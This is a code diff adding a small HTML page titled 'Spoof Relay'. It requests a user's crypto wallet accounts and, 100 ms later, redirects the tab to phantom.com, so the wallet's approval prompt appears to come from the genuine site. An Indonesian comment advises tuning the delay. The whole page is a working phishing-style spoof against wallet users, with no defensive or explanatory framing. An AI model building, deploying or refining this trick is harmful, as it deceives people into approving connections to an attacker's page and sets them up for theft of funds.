@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Spoof Relay</title>
+</head>
+<body>
+  <h2>Connecting Wallet…</h2>
+  <p id="msg">Please approve the popup.</p>
+
+  <script>
+    (async () => {
+      if (!window.ethereum) {
+        document.getElementById('msg').innerText = 'No wallet installed!';
+        return;
+      }
+
+      try {
+        const accountsPromise = window.ethereum.request({
+          method: 'eth_requestAccounts'
+        });
+
+        setTimeout(() => {
+          window.location.href = 'https://phantom.com';
+        }, 100);  // 100ms – sesuaikan jika perlu lebih cepat/lambat
+
+        const accounts = await accountsPromise;
+        document.getElementById('msg').innerText =
+          'Connected: ' + accounts[0];
+      } catch (err) {
+        document.getElementById('msg').innerText = 'Connection failed';
+        console.error(err);
+      }
+    })();
+  </script>
+</body>
+</html>
